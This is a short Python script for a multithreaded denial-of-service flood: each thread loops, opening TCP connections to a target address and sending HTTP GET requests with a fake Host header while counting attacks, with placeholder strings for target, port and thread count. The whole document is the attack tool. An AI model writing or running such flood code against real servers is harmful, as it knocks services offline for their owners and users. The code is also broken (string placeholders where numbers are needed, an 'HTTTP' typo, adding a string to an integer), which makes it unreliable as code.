import socket
import threading

target = 'Provide the ip adress on which the service is operating'
fake_ip = 'Provide a fake ip address you want to use (doesnt conceal you)'
port = 'the port no. of your pc you want to attack'

attack_num = 0 # you know you shouldnot init this in the while loop /(make required changes)

def attack():
    while True:
        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        s.connect((target , port))
        s.sendto(("GET /" + target + " HTTTP/1.1\r\n ").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num #accesing the variable initialised outside the function
        attack_num += 1
        print(""+attack_num)

        s.close()

for i in range('no. of thread'):
    thread = threading.Thread(target=attack)
    thread.start()

